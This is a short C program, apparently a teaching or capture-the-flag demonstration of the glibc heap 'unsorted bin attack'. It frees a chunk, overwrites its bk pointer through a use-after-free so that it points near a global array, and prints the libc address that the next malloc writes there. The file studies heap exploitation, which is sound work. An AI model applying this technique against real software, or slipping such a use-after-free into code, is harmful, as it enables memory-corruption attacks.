#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

long long list[0x20] = {0};

int main(){	
	long long *p,*q;
	init();
	// init a chunk
	p = malloc(0xf8);
	// malloc a chunk to avoid merging into top chunk
	q = malloc(0x18);
	// place p into unsorted bin
	free(p);
	sleep(0);
	// set p's bk to target_addr - 0x10
	p[1] = (char *)&list[0] - 0x10;
	sleep(0);
	// malloc to trigger unsorted bin attack
	p = malloc(0xf8);
	sleep(0);
	printf("%p\n",list[0]);
	sleep(0);
}

